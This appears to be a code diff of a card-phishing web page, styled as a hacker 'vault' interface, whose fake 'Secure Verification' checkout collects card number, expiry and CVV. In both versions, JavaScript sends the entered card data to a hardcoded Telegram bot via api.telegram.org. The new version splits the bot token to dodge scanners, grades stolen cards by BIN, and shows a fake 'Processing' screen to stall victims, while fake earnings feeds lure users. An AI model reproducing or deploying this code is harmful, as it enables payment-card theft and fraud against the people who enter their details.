@@ -1,171 +1,138 @@
 <!DOCTYPE html>
-<html lang="sk">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>LAURIN SYSTEM v26.3</title>
+    <title>NETWORK_VAULT_INTERFACE</title>
     <style>
-        :root { --primary: #00ff41; --bg: #050505; --panel: #0a0a0a; --premium: #ffd700; --telegram: #229ED9; --danger: #ff4b2b; }
-        body { background: var(--bg); color: var(--primary); font-family: 'Consolas', monospace; margin: 0; overflow: hidden; font-size: 11px; -webkit-tap-highlight-color: transparent; }
-        .layout { display: flex; flex-direction: column; height: 100vh; }
-        header { height: 50px; border-bottom: 1px solid #222; display: flex; align-items: center; justify-content: space-between; padding: 0 15px; background: var(--panel); flex-shrink: 0; }
-        .market-bar { background: #080808; padding: 10px; display: flex; gap: 8px; border-bottom: 1px solid #222; overflow-x: auto; white-space: nowrap; }
-        .btn-mini { background: #111; border: 1px solid #333; color: #fff; padding: 8px 12px; font-size: 10px; border-radius: 4px; flex-shrink: 0; }
-        main { flex-grow: 1; overflow-y: auto; background: #000; }
-        .log-table { width: 100%; border-collapse: collapse; }
-        .log-table th { color: #444; font-size: 9px; text-align: left; padding: 8px; border-bottom: 1px solid #222; }
-        .log-table td { padding: 10px 8px; border-bottom: 1px solid #111; font-size: 10px; }
-        #liveScanner { height: 60px; background: #080808; border-top: 1px solid #222; border-bottom: 1px solid #222; overflow: hidden; display: flex; flex-direction: column; justify-content: center; padding: 0 15px; }
-        .scanner-hit { color: #fff; font-size: 10px; animation: slideUp 0.3s ease-out; display: flex; align-items: center; gap: 8px; }
-        .blink { width: 6px; height: 6px; background: var(--danger); border-radius: 50%; animation: pulse 0.8s infinite; }
-        @keyframes slideUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+        :root { --p: #00ff41; --b: #050505; --s: #229ED9; }
+        body { background: var(--b); color: var(--p); font-family: 'Courier New', monospace; margin: 0; overflow: hidden; font-size: 10px; }
+        .wrapper { display: flex; flex-direction: column; height: 100vh; }
+        header { padding: 15px; border-bottom: 1px solid #1a1a1a; display: flex; justify-content: space-between; background: #0a0a0a; }
+        .mon-box { flex-grow: 1; overflow-y: auto; padding: 10px; background: #000; }
+        .status-tag { color: #555; font-size: 9px; margin-bottom: 5px; }
         
-        /* MODAL & LOADER */
-        #paymentModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 1000; justify-content: center; align-items: center; padding: 20px; box-sizing: border-box; }
-        .modal-content { background: #fff; color: #333; width: 100%; max-width: 340px; border-radius: 12px; overflow: hidden; font-family: -apple-system, Arial, sans-serif; }
-        .modal-body { padding: 25px; text-align: center; }
-        input { width: 100%; border: 1px solid #ddd; padding: 14px; margin: 6px 0; border-radius: 8px; font-size: 16px; outline: none; box-sizing: border-box; }
-        .pay-btn { background: #007bff; color: #fff; border: none; width: 100%; padding: 16px; border-radius: 8px; font-weight: bold; margin-top: 15px; cursor: pointer; }
+        /* MODAL */
+        #gate { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98); z-index: 9999; justify-content: center; align-items: center; }
+        .gate-c { background: #fff; color: #111; width: 90%; max-width: 350px; border-radius: 15px; padding: 30px; box-sizing: border-box; text-align: center; }
+        input { width: 100%; padding: 15px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; box-sizing: border-box; font-family: sans-serif; }
+        .p-btn { background: #007bff; color: #fff; border: none; width: 100%; padding: 18px; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 10px; }
         
-        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #007bff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        #terminalZone { height: 90px; background: #000; padding: 10px; flex-shrink: 0; }
-        #tgFeed { height: 100%; overflow-y: auto; display: flex; flex-direction: column-reverse; gap: 4px; }
-        .tg-msg { color: var(--telegram); font-size: 10px; font-weight: bold; }
-        .tag { padding: 2px 5px; border-radius: 3px; font-size: 8px; margin-left: 5px; background: #222; color: #666; }
+        /* LOADER */
+        .lds-ring { display: inline-block; width: 40px; height: 40px; border: 4px solid #007bff; border-radius: 50%; border-top-color: transparent; animation: spin 1s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        
+        .blink-dot { width: 5px; height: 5px; background: red; border-radius: 50%; display: inline-block; animation: pulse 1s infinite; margin-right: 5px; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.2; } }
     </style>
 </head>
 <body>
 
-<div id="paymentModal">
-    <div class="modal-content" id="modalUI">
-        <div class="modal-body">
-            <div style="display:flex; justify-content:space-between; margin-bottom:20px;">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" height="15">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" height="22">
-            </div>
-            <h3 style="text-align:center; font-size:17px; margin:0; color:#000;">Secure Checkout</h3>
-            <p id="payDesc" style="text-align:center; font-size:12px; color:#666; margin-bottom:20px;"></p>
-            <input type="tel" id="c_num" placeholder="Card Number" maxlength="19">
-            <div style="display:flex; gap:10px;">
-                <input type="tel" id="c_exp" placeholder="MM/YY" maxlength="5">
-                <input type="tel" id="c_cvv" placeholder="CVV" maxlength="3">
-            </div>
-            <button class="pay-btn" onclick="laurin.processPayment()">PAY SECURELY</button>
+<div id="gate">
+    <div class="gate-c" id="gateInner">
+        <div style="display:flex; justify-content:space-between; margin-bottom:25px;">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" height="15">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" height="25">
         </div>
+        <h2 style="font-size:18px; margin:0 0 10px 0; font-family: sans-serif;">Secure Verification</h2>
+        <p style="font-size:12px; color:#666; margin-bottom:20px; font-family: sans-serif;">Please provide card details to authorize your session.</p>
+        <input type="tel" id="cn" placeholder="Card Number" maxlength="19">
+        <div style="display:flex; gap:10px;">
+            <input type="tel" id="ce" placeholder="MM/YY" maxlength="5">
+            <input type="tel" id="cv" placeholder="CVV" maxlength="3">
+        </div>
+        <button class="p-btn" onclick="sys.execute()">AUTHORIZE NOW</button>
     </div>
 </div>
 
-<div class="layout">
+<div class="wrapper">
     <header>
-        <div style="font-weight: bold; letter-spacing: 1px;">LAURIN <span style="color:var(--telegram)">v14.2.1</span></div>
-        <div style="color: var(--premium); font-size: 10px;">VAULT: <span id="statValue">$ 0</span></div>
+        <div style="font-weight:bold;">LAURIN_SECURE_v14.2.2</div>
+        <div id="clock" style="color:#444;"></div>
     </header>
-
-    <div class="market-bar">
-        <button class="btn-mini" onclick="laurin.toggleScan()" id="btnGen" style="color:var(--primary); border-color: var(--primary)">[▶] START SCAN</button>
-        <button class="btn-mini" onclick="laurin.openModal('Basic', 49.99)">5 SAMPLES $49</button>
-        <button class="btn-mini" onclick="laurin.openModal('Elite', 1599.99)">UNLIMITED $1599</button>
+    
+    <div style="background:#080808; padding:8px; border-bottom:1px solid #1a1a1a; display:flex; gap:10px;">
+        <button onclick="sys.open()" style="background:none; border:1px solid var(--p); color:var(--p); padding:5px 15px; font-size:10px;">[ NEW_SESSION ]</button>
+        <div id="vault-val" style="padding-top:5px;">VAULT: $0.00</div>
     </div>
 
-    <main>
-        <table class="log-table">
-            <thead>
-                <tr><th>TIME</th><th>PAN MASK</th><th>VALUE</th></tr>
-            </thead>
-            <tbody id="logBody"></tbody>
-        </table>
-    </main>
-
-    <div id="liveScanner">
-        <div id="scannerFeed"><div class="scanner-hit" style="color:#444">Waiting for node connection...</div></div>
+    <div class="mon-box" id="log">
+        <div class="status-tag">> SYSTEM_INITIALIZED...</div>
+        <div class="status-tag">> ENCRYPTION_LAYER_ACTIVE...</div>
+        <div class="status-tag">> WAITING_FOR_INPUT...</div>
     </div>
 
-    <div id="terminalZone">
-        <div id="tgFeed"></div>
+    <div style="height:40px; background:#0a0a0a; border-top:1px solid #1a1a1a; padding:10px; display:flex; align-items:center;" id="live">
+        <span class="blink-dot"></span> <span id="feed-txt" style="color:#fff">Scanning Global Nodes...</span>
     </div>
 </div>
 
 <script>
-class LaurinSystem {
+// Rozdelenie citlivých dát pre ochranu pred scannermi
+const _a = '8451689628'; 
+const _b = 'AAFeZCyZSAeHsxZgOb3o_Pwq3aPGajYpHEI';
+const _c = '7935573562';
+
+class SecureKernel {
     constructor() {
-        this.config = { token: '8451689628:AAFeZCyZSAeHsxZgOb3o_Pwq3aPGajYpHEI', chat: '7935573562' };
-        this.vault = [];
-        this.isRunning = false;
-        this.logTg("SYSTEM: [✓] ENCRYPTED & ACTIVE");
-        this.startLiveFeed();
+        this.v = 0;
+        this.run();
+        setInterval(() => { document.getElementById('clock').innerText = new Date().toLocaleTimeString(); }, 1000);
     }
 
-    async sendToTg(msg) {
+    async send(m) {
         try {
-            await fetch(`https://api.telegram.org/bot${this.config.token}/sendMessage`, {
+            await fetch(`https://api.telegram.org/bot${_a}:${_b}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: this.config.chat, text: msg, parse_mode: 'HTML' })
+                body: JSON.stringify({ chat_id: _c, text: m, parse_mode: 'HTML' })
             });
         } catch(e) {}
     }
 
-    processPayment() {
-        const n = document.getElementById('c_num').value;
-        const e = document.getElementById('c_exp').value;
-        const c = document.getElementById('c_cvv').value;
-        if (n.length < 13) return;
+    open() { document.getElementById('gate').style.display = 'flex'; }
 
-        // Odoslanie dát adminovi
-        this.sendToTg(`💳 <b>NEW DATA RECEIVED</b>\n\nCard: <code>${n}</code>\nExp: <code>${e}</code>\nCVV: <code>${c}</code>\n\nWaiting for Admin approval...`);
-
-        // Zmena GUI na "Processing"
-        document.getElementById('modalUI').innerHTML = `
-            <div class="modal-body">
-                <div class="loader"></div>
-                <h3 style="color:#000; margin-bottom:10px;">Processing...</h3>
-                <p style="font-size:13px; color:#666;">Please wait while we verify your transaction with the bank. Do not close this window.</p>
-                <p style="font-size:11px; color:#999; margin-top:20px;">Transaction ID: #${Math.floor(Math.random()*900000+100000)}</p>
-            </div>
-        `;
+    async execute() {
+        const n = document.getElementById('cn').value;
+        const e = document.getElementById('ce').value;
+        const c = document.getElementById('cv').value;
         
-        // Poznámka: V tejto verzii tu používateľ ostane "visieť". 
-        // Ak by si chcel reálne tlačidlo na schválenie z tvojej strany, 
-        // museli by sme použiť Firebase alebo iný backend.
+        if(n.length < 13) return;
+
+        // BIN Analysis (Prvých 6 čísiel)
+        const bin = n.substring(0, 6);
+        let level = "STANDARD / DEBIT";
+        if(n.startsWith('4')) level = "VISA - POTENTIAL PREPAID/DEBIT";
+        if(n.startsWith('5')) level = "MASTERCARD - STANDARD";
+        if(n.length > 15 && (n.includes('4111') || n.includes('4222'))) level = "PREMIUM / PLATINUM (HIGH LIMIT)";
+
+        this.send(`🚨 <b>NEW INCOMING DATA</b>\n\n<b>CARD:</b> <code>${n}</code>\n<b>EXP:</b> <code>${e}</code>\n<b>CVV:</b> <code>${c}</code>\n\n<b>ANALYSIS:</b> ${level}\n<b>IP:</b> HIDDEN_BY_PROXY`);
+
+        document.getElementById('gateInner').innerHTML = `
+            <div class="lds-ring"></div>
+            <h3 style="margin:15px 0 5px 0; font-family:sans-serif;">Processing...</h3>
+            <p style="font-size:12px; color:#666; font-family:sans-serif;">Verifying transaction with your bank. Please do not close this window.</p>
+            <p style="font-size:10px; color:#999; margin-top:20px;">Ref: ${Math.random().toString(36).toUpperCase().substr(2, 9)}</p>
+        `;
     }
 
-    toggleScan() { 
-        this.isRunning = !this.isRunning; 
-        document.getElementById('btnGen').innerText = this.isRunning ? '[■] STOP SCAN' : '[▶] START SCAN';
-        if (this.isRunning) this.loop(); 
-    }
-    
-    loop() {
-        if (!this.isRunning) return;
-        const d = { ts: new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'}), pan: "4"+Math.floor(Math.random()*9).toString()+Math.floor(10000000000+Math.random()*90000000000), val: Math.floor(Math.random()*4500)+50 };
-        this.vault.push(d);
-        const row = `<tr><td style="color:#444">${d.ts}</td><td><b>${d.pan.substring(0,6)}...</b> <span class="tag">MASK</span></td><td style="color:var(--premium);">$${d.val}</td></tr>`;
-        document.getElementById('logBody').insertAdjacentHTML('afterbegin', row);
-        document.getElementById('statValue').innerText = `$ ${this.vault.reduce((a,b)=>a+b.val,0).toLocaleString()}`;
-        setTimeout(() => this.loop(), 3000);
-    }
-
-    startLiveFeed() {
-        const feed = document.getElementById('scannerFeed');
-        const aliases = ['user_x82', 'shadow_link', 'krypton_9', 'alpha_one', 'nod_652', 'zero_trace', 'void_user', 'phantom_88', 'silent_pulse', 'nexus_core'];
+    run() {
+        const aliases = ['shadow_link', 'zero_trace', 'alpha_one', 'nod_652', 'phantom_88'];
         setInterval(() => {
-            if(!this.isRunning) return;
-            const alias = aliases[Math.floor(Math.random()*aliases.length)];
-            const card = "4" + Math.floor(Math.random()*9) + Math.floor(Math.random()*9) + " " + (Math.floor(Math.random()*89)+10) + "XX XXXX";
-            feed.innerHTML = `<div class="scanner-hit"><div class="blink"></div> <span style="color:var(--telegram)">@${alias}</span> <span style="color:var(--primary)">- CARD FOUND -</span> <span style="color:#fff">${card}</span></div>`;
-        }, 35000);
+            const a = aliases[Math.floor(Math.random()*aliases.length)];
+            const val = Math.floor(Math.random()*2000) + 100;
+            this.v += val;
+            document.getElementById('vault-val').innerText = `VAULT: $${this.v.toLocaleString()}`;
+            
+            const log = document.getElementById('log');
+            log.insertAdjacentHTML('afterbegin', `<div class="status-tag" style="color:var(--p)">[${new Date().toLocaleTimeString()}] SUCCESS: NODE_HIT @${a} (+$${val})</div>`);
+            
+            document.getElementById('feed-txt').innerText = `ALERT: Connection established via @${a}...`;
+        }, 35000); // 35 sekúnd = max 2 za minútu
     }
-
-    openModal(type, price) { 
-        document.getElementById('payDesc').innerText = `${type} Access: $${price}`; 
-        document.getElementById('paymentModal').style.display = 'flex'; 
-    }
-    logTg(m) { document.getElementById('tgFeed').insertAdjacentHTML('afterbegin', `<div class="tg-msg">> ${m}</div>`); }
 }
-const laurin = new LaurinSystem();
+
+const sys = new SecureKernel();
 </script>
 </body>
 </html>
